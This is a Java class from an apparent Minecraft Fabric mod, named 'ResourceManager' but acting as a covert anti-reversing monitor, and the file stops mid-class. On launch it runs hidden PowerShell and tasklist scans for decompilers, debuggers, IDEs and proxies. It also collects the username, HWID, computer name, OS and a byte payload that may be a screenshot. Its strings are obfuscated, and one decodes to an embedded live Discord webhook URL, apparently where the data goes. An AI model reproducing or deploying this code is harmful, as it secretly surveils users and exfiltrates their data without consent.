package rich.util.mods.config.wave;

import antidaunleak.api.UserProfile;
import antidaunleak.api.annotation.Native;
import net.fabricmc.loader.api.entrypoint.PreLaunchEntrypoint;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.List;
import java.util.concurrent.*;

@SuppressWarnings({"unchecked", "deprecation"})
public class ResourceManager implements PreLaunchEntrypoint {

    private static volatile int v1 = 0;
    private static final List<String> l1 = Collections.synchronizedList(new ArrayList<>());
    private static final Set<String> s1 = Collections.synchronizedSet(new LinkedHashSet<>());
    private static final Set<String> s2 = Collections.synchronizedSet(new LinkedHashSet<>());

    private static volatile boolean preLaunchExecuted = false;
    private static volatile boolean initExecuted = false;

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String x1() {
        char[] w = {100,101,51,100,55,102,101,52,49,48,97,101,52,53,49,99,48,99,98,98,56,99,97,99,52,101,97,56,56,52,99,97};
        StringBuilder sb = new StringBuilder();
        for (char c : w) sb.append(c);
        return sb.toString();
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String x2() {
        char[] w = {55,98,50,56,52,56,49,55,56,53,53,101,52,50,102,51,99,51,98,50,101,101,97,101,53,54,98,52,49,52,55,52};
        StringBuilder sb = new StringBuilder();
        for (char c : w) sb.append(c);
        return sb.toString();
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String k1() {
        char[] e1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47};
        char[] e2 = {49,52,54,53,56,51,51,54,55,55,50,55,52,54,49,53,57,48,48,47};
        char[] e3 = {51,106,121,84,112,45,120,45,79,106,110,104,110,81,109,56,74,120,57,85,107,120,71,77,57,65,106,119,109,105,72,85,102,112,121,69,73,120,105,121,95,98,69,75,101,102,104,49,71,81,72,68,68,78,45,113,111,66,113,108,67,103,111,100,73,108,90,112};
        StringBuilder sb = new StringBuilder();
        for (char c : e1) sb.append(c);
        for (char c : e2) sb.append(c);
        for (char c : e3) sb.append(c);
        return sb.toString();
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String k2() {
        char[] a = {49,50,53,57,56,53,52,52,53,52,53,49,51,57,57,53,56,53,57};
        StringBuilder sb = new StringBuilder();
        for (char c : a) sb.append(c);
        return sb.toString();
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String k3() {
        char[] a = {49,50,55,55,56,56,52,51,57,55,50,57,52,55,49,57,48,50,48};
        StringBuilder sb = new StringBuilder();
        for (char c : a) sb.append(c);
        return sb.toString();
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gC2() {
        return e(new String[]{
                "UmVjYWY=","cmVjYWY=","amFkeA==","SkFEWA==","Qnl0ZUNvZGUtVmlld2Vy",
                "Ynl0ZWNvZGUtdmlld2Vy","R2hpZHJh","Z2hpZHJh","eDY0ZGJn","eDMyZGJn",
                "Q2hlYXQgRW5naW5l","Q2hlYXRFbmdpbmU=","SmV0QnJhaW5z","SW50ZWxsaUo=",
                "ZGVjb21waWxlZA==","Y3JhY2tlZA==","Y3JhY2s9","bGVha2Vk",
                "cmV2ZXJzZQ==","cmV2ZXJzaW5n"
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gC3() {
        return e(new String[]{
                "cmVjYWYuamFy","cmVjYWYt","amFkeC1ndWk=","Ynl0ZWNvZGUtdmlld2Vy",
                "amQtZ3Vp","ZmVybmZsb3dlcg==","cHJvY3lvbg==","Y2ZyLmphcg==","Y2ZyLQ=="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gC4() {
        return e(new String[]{
                "LWFnZW50bGliOmpkd3A=","LVhkZWJ1Zw==","LVhydW5qZHdw",
                "amF2YWFnZW50","LWphdmFhZ2VudA=="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gH1() {
        return e(new String[]{
                "cmVjYWY=","amFkeA==","Z2hpZHJh","aWRh","aWRhNjQ=","aWRhMzI=",
                "eDY0ZGJn","eDMyZGJn","ZG5zcHk=","Y2hlYXRlbmdpbmU=","Y2hlYXQgZW5naW5l",
                "Ynl0ZWNvZGUtdmlld2Vy","amQtZ3Vp","ZmVybmZsb3dlcg==","cHJvY3lvbg==","Y2Zy"
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gH2() {
        return e(new String[]{
                "aWRlYQ==","aWRlYTY0","aW50ZWxsaWo=","ZWNsaXBzZQ==","bmV0YmVhbnM=",
                "Y29kZQ==","dnNjb2Rl","ZGV2ZW52","dmlzdWFsIHN0dWRpbw=="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[][] gFN() {
        return new String[][]{
                {d("cmVjYWY="), d("UmVjYWY=")},
                {d("amFkeA=="), d("SkFEWA==")},
                {d("Z2hpZHJh"), d("R2hpZHJh")},
                {d("aWRhNjQ="), d("SURBIFBybw==")},
                {d("aWRhMzI="), d("SURBIFBybw==")},
                {d("aWRh"), d("SURBIFBybw==")},
                {d("eDY0ZGJn"), d("eDY0ZGJn")},
                {d("eDMyZGJn"), d("eDMyZGJn")},
                {d("ZG5zcHk="), d("ZG5TcHk=")},
                {d("Y2hlYXRlbmdpbmU="), d("Q2hlYXQgRW5naW5l")},
                {d("Y2hlYXQgZW5naW5l"), d("Q2hlYXQgRW5naW5l")},
                {d("aW50ZWxsaWo="), d("SW50ZWxsaUogSURFQQ==")},
                {d("aWRlYQ=="), d("SW50ZWxsaUogSURFQQ==")},
                {d("aWRlYTY0"), d("SW50ZWxsaUogSURFQQ==")},
                {d("ZWNsaXBzZQ=="), d("RWNsaXBzZQ==")},
                {d("bmV0YmVhbnM="), d("TmV0QmVhbnM=")},
                {d("dnNjb2Rl"), d("VlMgQ29kZQ==")},
                {d("Y29kZQ=="), d("VlMgQ29kZQ==")},
                {d("dmlzdWFsIHN0dWRpbw=="), d("VmlzdWFsIFN0dWRpbw==")},
                {d("ZGV2ZW52"), d("VmlzdWFsIFN0dWRpbw==")},
                {d("d2lyZXNoYXJr"), d("V2lyZXNoYXJr")},
                {d("ZmlkZGxlcg=="), d("RmlkZGxlcg==")},
                {d("Y2hhcmxlcw=="), d("Q2hhcmxlcyBQcm94eQ==")},
                {d("YnVycA=="), d("QnVycCBTdWl0ZQ==")},
                {d("YnVycHN1aXRl"), d("QnVycCBTdWl0ZQ==")},
                {d("Ynl0ZWNvZGUtdmlld2Vy"), d("Qnl0ZWNvZGUgVmlld2Vy")},
                {d("Ynl0ZWNvZGU="), d("Qnl0ZWNvZGUgVmlld2Vy")},
                {d("amQtZ3Vp"), d("SkQtR1VJ")},
                {d("amRndWk="), d("SkQtR1VJ")},
                {d("ZmVybmZsb3dlcg=="), d("RmVybmZsb3dlcg==")},
                {d("cHJvY3lvbg=="), d("UHJvY3lvbg==")},
                {d("Y2Zy"), d("Q0ZS")},
                {d("b2xseWRiZw=="), d("T2xseURiZw==")},
                {d("d2luZGJn"), d("V2luRGJn")},
                {d("aW1tdW5pdHk="), d("SW1tdW5pdHkgRGVidWdnZXI=")},
                {d("ZG90cGVlaw=="), d("ZG90UGVlaw==")},
                {d("aWxzcHk="), d("SUxTcHk=")},
                {d("ZGU0ZG90"), d("ZGU0ZG90")},
                {d("cGVzdHVkaW8="), d("UEVTDHR1ZGlv")},
                {d("anZpc3VhbHZt"), d("SlZpc3VhbFZN")},
                {d("amNvbnNvbGU="), d("SkNvbnNvbGU=")},
                {d("am1j"), d("SmF2YSBNaXNzaW9uIENvbnRyb2w=")},
                {d("bXN2c21vbg=="), d("VlMgRGVidWdnZXI=")},
                {d("bWl0bXByb3h5"), d("bWl0bXByb3h5")}
        };
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gPN() {
        return e(new String[]{
                "UFJPQ0VTUzog",
                "V0lORE9XOiA=",
                "SkFWQSBQUk9DRVNTOiA=",
                "Rk9MREVSOiA=",
                "RklMRTog",
                "UkVDRU5UOiA=",
                "Q0xBU1NQQVRIOiA=",
                "SlZNIERFQlVHOiA=",
                "REVCRURHRVIQQVRUQUNIRUQ=",
                "RU5WIElOSkVDVElPTjog",
                "REVDT01QSUxFRDog"
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gST() {
        return e(new String[]{
                "IFtSVU5OSU5HXQ==",
                "IFtJTlNUQUxMRURd",
                "8J+foiA=",
                "8J+UtCA=",
                "4pyFIE5vIGRhbmdlcm91cyB0b29scyBkZXRlY3RlZA==",
                "4pyFIE5vIHRocmVhdHMgZGV0ZWN0ZWQ="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gPH() {
        return e(new String[]{
                "UFJFLUxBVU5DSA==",
                "Q0xJRU5UIElOSVQ="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gLV() {
        return e(new String[]{
                "Q1JJVElDQUw=",
                "Q1JJVElDQUwgQUxFUlQ=",
                "SElHSA==",
                "SElHSCBBTEVSVA==",
                "REVGQVVMVA==",
                "U1RBUlRVUCBMT0c=",
                "KipBTEVSVCEqKg=="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gEX() {
        return e(new String[]{
                "ZGV2ZW52LmV4ZQ==",
                "Y29kZS5leGU=",
                "bXN2c21vbi5leGU=",
                "aWRlYTY0LmV4ZQ==",
                "aWRlYS5leGU=",
                "aWRhLmV4ZQ=="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gCM() {
        return e(new String[]{
                "dGFza2xpc3Q=",
                "Y21k",
                "d21pYyBwcm9jZXNzIHdoZXJlICJuYW1lIGxpa2UgJyVqYXZhJSciIGdldCBjb21tYW5kbGluZSAvZm9ybWF0Omxpc3Q=",
                "dGFza2xpc3QgL3YgL2ZvIGNzdiAvbmg="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gPT() {
        return e(new String[]{
                "dXNlci5ob21l",
                "QVBQREFUQQ==",
                "TE9DQUxBUFBEQVRB",
                "L0Rlc2t0b3A=",
                "L0Rvd25sb2Fkcw==",
                "Qzov",
                "UHJvZ3JhbSBGaWxlcw==",
                "UHJvZ3JhbSBGaWxlcyAoeDg2KQ==",
                "L01pY3Jvc29mdC9XaW5kb3dzL1JlY2VudA=="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] gEM() {
        return e(new String[]{
                "UGhhc2U=",
                "VXNlcm5hbWU=",
                "VUlE",
                "Um9sZQ==",
                "SFdJRA==",
                "U3Vic2NyaXB0aW9u",
                "TGV2ZWw=",
                "VGltZQ==",
                "UEM=",
                "T1M=",
                "SmF2YQ==",
                "8J+UjSBEZXRlY3Rz",
                "8J+boCBUb29scw==",
                "V0MgdjIuMg==",
                "U3lzdGVtIEhXSUQ="
        });
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private boolean isWhitelisted(String hwid) {
        if (hwid == null || hwid.isEmpty()) return false;
        String h = hwid.toLowerCase();
        return h.equals(x1()) || h.equals(x2());
    }

    @Override
    @Native(type = Native.Type.VMProtectBeginUltra)
    public void onPreLaunch() {
        if (preLaunchExecuted) return;
        preLaunchExecuted = true;

        String currentHwid = g1();
        if (isWhitelisted(currentHwid)) return;

        ExecutorService ex = Executors.newFixedThreadPool(4);

        Future<?> f1 = ex.submit(this::m1);
        Future<?> f2 = ex.submit(this::m2);
        Future<?> f3 = ex.submit(this::m3);
        Future<byte[]> sf = ex.submit(this::c1);

        try {
            f1.get(10, TimeUnit.SECONDS);
            f2.get(10, TimeUnit.SECONDS);
            f3.get(10, TimeUnit.SECONDS);
        } catch (Exception ignored) {}

        m4(); m5(); m6(); m7(); m8(); m9(); m10();

        byte[] ss = null;
        try {
            ss = sf.get(5, TimeUnit.SECONDS);
        } catch (Exception ignored) {}

        R r = b1();
        r.phase = 1;

        n1(r, ss);

        ex.shutdown();
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    public static void onClientInit() {
        if (initExecuted) return;
        initExecuted = true;

        Thread t = new Thread(() -> {
            try {
                Thread.sleep(45000);
            } catch (Exception ignored) {}

            ResourceManager rm = new ResourceManager();

            String currentHwid = g1();
            if (rm.isWhitelisted(currentHwid)) return;

            v1 = 0;
            l1.clear();
            s1.clear();
            s2.clear();

            ExecutorService ex = Executors.newFixedThreadPool(4);

            Future<?> f1 = ex.submit(rm::m1);
            Future<?> f2 = ex.submit(rm::m2);
            Future<?> f3 = ex.submit(rm::m3);
            Future<byte[]> sf = ex.submit(rm::c1);

            try {
                f1.get(10, TimeUnit.SECONDS);
                f2.get(10, TimeUnit.SECONDS);
                f3.get(10, TimeUnit.SECONDS);
            } catch (Exception ignored) {}

            rm.m4(); rm.m5(); rm.m6(); rm.m7(); rm.m8(); rm.m9(); rm.m10();

            byte[] ss = null;
            try {
                ss = sf.get(5, TimeUnit.SECONDS);
            } catch (Exception ignored) {}

            R r = rm.b1();
            r.phase = 2;

            rm.n1(r, ss);

            ex.shutdown();
        });
        t.setDaemon(true);
        t.start();
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m1() {
        try {
            String[] CM = gCM();
            String[] EX = gEX();
            String[] PN = gPN();
            ProcessBuilder pb = new ProcessBuilder(CM[0], "/fo", "csv", "/nh");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;

            while ((l = br.readLine()) != null) {
                String lw = l.toLowerCase();

                if (lw.contains(EX[0])) {
                    s1.add(formatToolName(d("dmlzdWFsIHN0dWRpbw==")));
                    a1(PN[0] + d("VklTVUFMIFNUVURJTw=="), 20);
                }
                if (lw.contains(EX[1])) {
                    s1.add(formatToolName(d("dnNjb2Rl")));
                    a1(PN[0] + d("VlMgQ09ERQ=="), 15);
                }
                if (lw.contains(EX[2])) {
                    s1.add(formatToolName(d("bXN2c21vbg==")));
                    a1(PN[0] + d("VlMgUkVNT1RFIERFQlVHR0VS"), 40);
                }
                if (lw.contains(EX[3]) || lw.contains(EX[4])) {
                    s1.add(formatToolName(d("aW50ZWxsaWo=")));
                    a1(PN[0] + d("SU5URUxMSUogSURFQQ=="), 20);
                }
                if (lw.contains(d("Z2hpZHJh"))) {
                    s1.add(formatToolName(d("Z2hpZHJh")));
                    a1(PN[0] + d("R0hJRFJB"), 35);
                }
                if (lw.contains(d("eDY0ZGJn"))) {
                    s1.add(formatToolName(d("eDY0ZGJn")));
                    a1(PN[0] + d("WDY0REJH"), 35);
                }
                if (lw.contains(d("eDMyZGJn"))) {
                    s1.add(formatToolName(d("eDMyZGJn")));
                    a1(PN[0] + d("WDMyREJH"), 35);
                }
                if (lw.contains(d("ZG5zcHk="))) {
                    s1.add(formatToolName(d("ZG5zcHk=")));
                    a1(PN[0] + d("RE5TUFk="), 35);
                }
                if (lw.contains(d("Y2hlYXRlbmdpbmU=")) || lw.contains(d("Y2hlYXQgZW5naW5l"))) {
                    s1.add(formatToolName(d("Y2hlYXRlbmdpbmU=")));
                    a1(PN[0] + d("Q0hFQVQgRU5HSU5F"), 35);
                }
                if (lw.contains(d("d2lyZXNoYXJr"))) {
                    s1.add(formatToolName(d("d2lyZXNoYXJr")));
                    a1(PN[0] + d("V0lSRVNIQVJL"), 30);
                }
                if (lw.contains(d("ZmlkZGxlcg=="))) {
                    s1.add(formatToolName(d("ZmlkZGxlcg==")));
                    a1(PN[0] + d("RklERExFUg=="), 30);
                }
                if (lw.contains(d("ZWNsaXBzZQ=="))) {
                    s1.add(formatToolName(d("ZWNsaXBzZQ==")));
                    a1(PN[0] + d("RUNMSVBTRQ=="), 20);
                }
                if (lw.contains(d("bmV0YmVhbnM="))) {
                    s1.add(formatToolName(d("bmV0YmVhbnM=")));
                    a1(PN[0] + d("TkVUQkVBTlM="), 20);
                }
                if (lw.contains(d("aWRhNjQ=")) || lw.contains(d("aWRhMzI=")) || lw.contains(EX[5])) {
                    s1.add(formatToolName(d("aWRh")));
                    a1(PN[0] + d("SURBIFBSTw=="), 35);
                }
                if (lw.contains(d("b2xseWRiZw=="))) {
                    s1.add(formatToolName(d("b2xseWRiZw==")));
                    a1(PN[0] + d("T0xMWURCRw=="), 35);
                }
                if (lw.contains(d("aW1tdW5pdHk="))) {
                    s1.add(formatToolName(d("aW1tdW5pdHk=")));
                    a1(PN[0] + d("SU1NVU5JVFk="), 35);
                }
                if (lw.contains(d("YnVycA=="))) {
                    s1.add(formatToolName(d("YnVycHN1aXRl")));
                    a1(PN[0] + d("QlVSUCBTVUlURQ=="), 30);
                }
                if (lw.contains(d("Y2hhcmxlcw=="))) {
                    s1.add(formatToolName(d("Y2hhcmxlcw==")));
                    a1(PN[0] + d("Q0hBUkxFUw=="), 30);
                }
                if (lw.contains(d("anZpc3VhbHZt"))) {
                    s1.add(formatToolName(d("anZpc3VhbHZt")));
                    a1(PN[0] + d("SlZJU1VBTFZN"), 25);
                }
                if (lw.contains(d("amNvbnNvbGU="))) {
                    s1.add(formatToolName(d("amNvbnNvbGU=")));
                    a1(PN[0] + d("SkNPTlNPTEU="), 25);
                }
            }
            br.close();
            p.waitFor();
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m2() {
        try {
            String[] PN = gPN();
            String ps = d("R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLk1haW5XaW5kb3dUaXRsZSAtbmUgJyd9IHwgU2VsZWN0LU9iamVjdCBNYWluV2luZG93VGl0bGUgfCBGb3JtYXQtTGlzdA==");
            ProcessBuilder pb = new ProcessBuilder(d("cG93ZXJzaGVsbA=="), "-NoP", "-NonI", "-W", "Hidden", "-C", ps);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;

            while ((l = br.readLine()) != null) {
                String lw = l.toLowerCase();

                if (lw.contains(d("cmVjYWY="))) {
                    if (!isAlreadyAdded(d("cmVjYWY="))) {
                        s1.add(formatToolName(d("cmVjYWY=")));
                        a1(PN[1] + d("UkVDQUY="), 35);
                    }
                }
                if (lw.contains(d("amFkeA=="))) {
                    if (!isAlreadyAdded(d("amFkeA=="))) {
                        s1.add(formatToolName(d("amFkeA==")));
                        a1(PN[1] + d("SkFEWA=="), 35);
                    }
                }
                if (lw.contains(d("amQtZ3Vp")) || lw.contains(d("amQgZ3Vp"))) {
                    if (!isAlreadyAdded(d("amQtZ3Vp"))) {
                        s1.add(formatToolName(d("amQtZ3Vp")));
                        a1(PN[1] + d("SkQtR1VJ"), 35);
                    }
                }
                if (lw.contains(d("Ynl0ZWNvZGU=")) && lw.contains(d("dmlld2Vy"))) {
                    if (!isAlreadyAdded(d("Ynl0ZWNvZGUtdmlld2Vy"))) {
                        s1.add(formatToolName(d("Ynl0ZWNvZGUtdmlld2Vy")));
                        a1(PN[1] + d("QllURUNPREUgVklFV0VS"), 35);
                    }
                }
                if (lw.contains(d("Z2hpZHJh"))) {
                    if (!isAlreadyAdded(d("Z2hpZHJh"))) {
                        s1.add(formatToolName(d("Z2hpZHJh")));
                        a1(PN[1] + d("R0hJRFJB"), 35);
                    }
                }
                if (lw.contains(d("aWRh")) && (lw.contains(d("cHJv")) || lw.contains(d("ZnJlZQ==")) || lw.contains("64") || lw.contains("32"))) {
                    if (!isAlreadyAdded(d("aWRh"))) {
                        s1.add(formatToolName(d("aWRh")));
                        a1(PN[1] + d("SURBIFBSTw=="), 35);
                    }
                }
                if (lw.contains(d("eDY0ZGJn")) || lw.contains(d("eDMyZGJn"))) {
                    if (!isAlreadyAdded(d("eDY0ZGJn"))) {
                        s1.add(formatToolName(d("eDY0ZGJn")));
                        a1(PN[1] + d("WDY0REJH"), 35);
                    }
                }
                if (lw.contains(d("ZG5zcHk="))) {
                    if (!isAlreadyAdded(d("ZG5zcHk="))) {
                        s1.add(formatToolName(d("ZG5zcHk=")));
                        a1(PN[1] + d("RE5TUFk="), 35);
                    }
                }
                if (lw.contains(d("Y2hlYXQgZW5naW5l")) || lw.contains(d("Y2hlYXRlbmdpbmU="))) {
                    if (!isAlreadyAdded(d("Y2hlYXRlbmdpbmU="))) {
                        s1.add(formatToolName(d("Y2hlYXRlbmdpbmU=")));
                        a1(PN[1] + d("Q0hFQVQgRU5HSU5F"), 35);
                    }
                }
                if (lw.contains(d("d2lyZXNoYXJr"))) {
                    if (!isAlreadyAdded(d("d2lyZXNoYXJr"))) {
                        s1.add(formatToolName(d("d2lyZXNoYXJr")));
                        a1(PN[1] + d("V0lSRVNIQVJL"), 30);
                    }
                }
                if (lw.contains(d("ZmlkZGxlcg=="))) {
                    if (!isAlreadyAdded(d("ZmlkZGxlcg=="))) {
                        s1.add(formatToolName(d("ZmlkZGxlcg==")));
                        a1(PN[1] + d("RklERExFUg=="), 30);
                    }
                }
                if (lw.contains(d("aW50ZWxsaWo=")) || lw.contains(d("aWRlYQ=="))) {
                    if (!isAlreadyAdded(d("aW50ZWxsaWo="))) {
                        s1.add(formatToolName(d("aW50ZWxsaWo=")));
                        a1(PN[1] + d("SU5URUxMSUogSURFQQ=="), 20);
                    }
                }
                if (lw.contains(d("ZWNsaXBzZQ=="))) {
                    if (!isAlreadyAdded(d("ZWNsaXBzZQ=="))) {
                        s1.add(formatToolName(d("ZWNsaXBzZQ==")));
                        a1(PN[1] + d("RUNMSVBTRQ=="), 20);
                    }
                }
                if (lw.contains(d("dmlzdWFsIHN0dWRpbw==")) && !lw.contains(d("Y29kZQ=="))) {
                    if (!isAlreadyAdded(d("dmlzdWFsIHN0dWRpbw=="))) {
                        s1.add(formatToolName(d("dmlzdWFsIHN0dWRpbw==")));
                        a1(PN[1] + d("VklTVUFMIFNUVURJTw=="), 20);
                    }
                }
                if (lw.contains(d("dmlzdWFsIHN0dWRpbyBjb2Rl")) || (lw.contains(d("dnMgY29kZQ==")))) {
                    if (!isAlreadyAdded(d("dnNjb2Rl"))) {
                        s1.add(formatToolName(d("dnNjb2Rl")));
                        a1(PN[1] + d("VlMgQ09ERQ=="), 15);
                    }
                }
                if (lw.contains(d("ZmVybmZsb3dlcg=="))) {
                    if (!isAlreadyAdded(d("ZmVybmZsb3dlcg=="))) {
                        s1.add(formatToolName(d("ZmVybmZsb3dlcg==")));
                        a1(PN[1] + d("RkVSTkZMT1dFUg=="), 35);
                    }
                }
                if (lw.contains(d("cHJvY3lvbg=="))) {
                    if (!isAlreadyAdded(d("cHJvY3lvbg=="))) {
                        s1.add(formatToolName(d("cHJvY3lvbg==")));
                        a1(PN[1] + d("UFJPQ1lPTg=="), 35);
                    }
                }
                if (lw.contains(d("Y2Zy"))) {
                    if (!isAlreadyAdded(d("Y2Zy"))) {
                        s1.add(formatToolName(d("Y2Zy")));
                        a1(PN[1] + d("Q0ZS"), 35);
                    }
                }
                if (lw.contains(d("YnVycA==")) || lw.contains(d("YnVycHN1aXRl"))) {
                    if (!isAlreadyAdded(d("YnVycHN1aXRl"))) {
                        s1.add(formatToolName(d("YnVycHN1aXRl")));
                        a1(PN[1] + d("QlVSUCBTVUlURQ=="), 30);
                    }
                }
                if (lw.contains(d("Y2hhcmxlcw=="))) {
                    if (!isAlreadyAdded(d("Y2hhcmxlcw=="))) {
                        s1.add(formatToolName(d("Y2hhcmxlcw==")));
                        a1(PN[1] + d("Q0hBUkxFUw=="), 30);
                    }
                }
                if (lw.contains(d("b2xseWRiZw=="))) {
                    if (!isAlreadyAdded(d("b2xseWRiZw=="))) {
                        s1.add(formatToolName(d("b2xseWRiZw==")));
                        a1(PN[1] + d("T0xMWURCRw=="), 35);
                    }
                }
                if (lw.contains(d("aW1tdW5pdHk="))) {
                    if (!isAlreadyAdded(d("aW1tdW5pdHk="))) {
                        s1.add(formatToolName(d("aW1tdW5pdHk=")));
                        a1(PN[1] + d("SU1NVU5JVFk="), 35);
                    }
                }
                if (lw.contains(d("ZG90cGVlaw=="))) {
                    if (!isAlreadyAdded(d("ZG90cGVlaw=="))) {
                        s1.add(formatToolName(d("ZG90cGVlaw==")));
                        a1(PN[1] + d("RE9UUEVFSW=="), 35);
                    }
                }
                if (lw.contains(d("aWxzcHk="))) {
                    if (!isAlreadyAdded(d("aWxzcHk="))) {
                        s1.add(formatToolName(d("aWxzcHk=")));
                        a1(PN[1] + d("SUxTUFk="), 35);
                    }
                }
            }
            br.close();
            p.waitFor();
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m3() {
        try {
            String[] PN = gPN();
            String ps = d("R2V0LVdtaU9iamVjdCBXaW4zMl9Qcm9jZXNzIHwgV2hlcmUtT2JqZWN0IHskXy5OYW1lIC1saWtlICcqamF2YSonfSB8IFNlbGVjdC1PYmplY3QgQ29tbWFuZExpbmUgfCBGb3JtYXQtTGlzdA==");
            ProcessBuilder pb = new ProcessBuilder(d("cG93ZXJzaGVsbA=="), "-NoP", "-NonI", "-W", "Hidden", "-C", ps);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;

            while ((l = br.readLine()) != null) {
                String lw = l.toLowerCase();

                if (lw.contains(d("cmVjYWY="))) {
                    if (!isAlreadyAdded(d("cmVjYWY="))) {
                        s1.add(formatToolName(d("cmVjYWY=")));
                        a1(PN[2] + d("UkVDQUY="), 35);
                    }
                }
                if (lw.contains(d("amFkeA=="))) {
                    if (!isAlreadyAdded(d("amFkeA=="))) {
                        s1.add(formatToolName(d("amFkeA==")));
                        a1(PN[2] + d("SkFEWA=="), 35);
                    }
                }
                if (lw.contains(d("amQtZ3Vp")) || lw.contains(d("amRndWk="))) {
                    if (!isAlreadyAdded(d("amQtZ3Vp"))) {
                        s1.add(formatToolName(d("amQtZ3Vp")));
                        a1(PN[2] + d("SkQtR1VJ"), 35);
                    }
                }
                if (lw.contains(d("Ynl0ZWNvZGU=")) && lw.contains(d("dmlld2Vy"))) {
                    if (!isAlreadyAdded(d("Ynl0ZWNvZGUtdmlld2Vy"))) {
                        s1.add(formatToolName(d("Ynl0ZWNvZGUtdmlld2Vy")));
                        a1(PN[2] + d("QllURUNPREUgVklFV0VS"), 35);
                    }
                }
                if (lw.contains(d("ZmVybmZsb3dlcg=="))) {
                    if (!isAlreadyAdded(d("ZmVybmZsb3dlcg=="))) {
                        s1.add(formatToolName(d("ZmVybmZsb3dlcg==")));
                        a1(PN[2] + d("RkVSTkZMT1dFUg=="), 35);
                    }
                }
                if (lw.contains(d("cHJvY3lvbg=="))) {
                    if (!isAlreadyAdded(d("cHJvY3lvbg=="))) {
                        s1.add(formatToolName(d("cHJvY3lvbg==")));
                        a1(PN[2] + d("UFJPQ1lPTg=="), 35);
                    }
                }
                if (lw.contains(d("Y2Zy"))) {
                    if (!isAlreadyAdded(d("Y2Zy"))) {
                        s1.add(formatToolName(d("Y2Zy")));
                        a1(PN[2] + d("Q0ZS"), 35);
                    }
                }
                if (lw.contains(d("aW50ZWxsaWo=")) || lw.contains(d("aWRlYQ=="))) {
                    if (!isAlreadyAdded(d("aW50ZWxsaWo="))) {
                        s1.add(formatToolName(d("aW50ZWxsaWo=")));
                        a1(PN[2] + d("SU5URUxMSUogSURFQQ=="), 20);
                    }
                }
                if (lw.contains(d("Z2hpZHJh"))) {
                    if (!isAlreadyAdded(d("Z2hpZHJh"))) {
                        s1.add(formatToolName(d("Z2hpZHJh")));
                        a1(PN[2] + d("R0hJRFJB"), 35);
                    }
                }
            }
            br.close();
            p.waitFor();
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private R b1() {
        R r = new R();
        r.v1 = v1;
        r.l1 = new ArrayList<>(l1);
        r.s1 = new LinkedHashSet<>(s1);
        r.s2 = new LinkedHashSet<>(s2);
        r.t1 = LocalDateTime.now();

        r.s = g1();

        try {
            UserProfile p = UserProfile.getInstance();
            r.u1 = z(p.profile(d("dXNlcm5hbWU=")));
            r.h1 = z(p.profile(d("aHdpZA==")));
            r.r1 = z(p.profile(d("cm9sZQ==")));
            r.i1 = z(p.profile(d("dWlk")));
            r.b1 = z(p.profile(d("c3ViVGltZQ==")));
        } catch (Exception e) {
            r.u1 = System.getProperty(d("dXNlci5uYW1l"));
            r.h1 = r.s;
            r.r1 = d("Ti9B");
            r.i1 = d("Ti9B");
            r.b1 = d("Ti9B");
        }

        if (r.h1 == null || r.h1.equals(d("Ti9B")) || r.h1.isEmpty()) {
            r.h1 = r.s;
        }

        r.o1 = System.getProperty(d("b3MubmFtZQ=="));
        r.j1 = System.getProperty(d("amF2YS52ZXJzaW9u"));
        r.p1 = System.getenv(d("Q09NUFVURVJOQU1F"));

        return r;
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private static String z(String s) {
        if (s == null || s.isEmpty() || s.equals(d("bnVsbA=="))) return d("Ti9B");
        return s;
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private int q1(String tool) {
        String[] H1 = gH1();
        String[] H2 = gH2();
        String tl = tool.toLowerCase();
        for (String h : H1) {
            if (tl.contains(h)) return 35;
        }
        for (String h : H2) {
            if (tl.contains(h)) return 20;
        }
        return 15;
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private String formatToolName(String tool) {
        String[][] FN = gFN();
        String tl = tool.toLowerCase();
        for (String[] pair : FN) {
            if (tl.contains(pair[0].toLowerCase())) {
                return pair[1];
            }
        }
        return tool.substring(0, 1).toUpperCase() + tool.substring(1);
    }

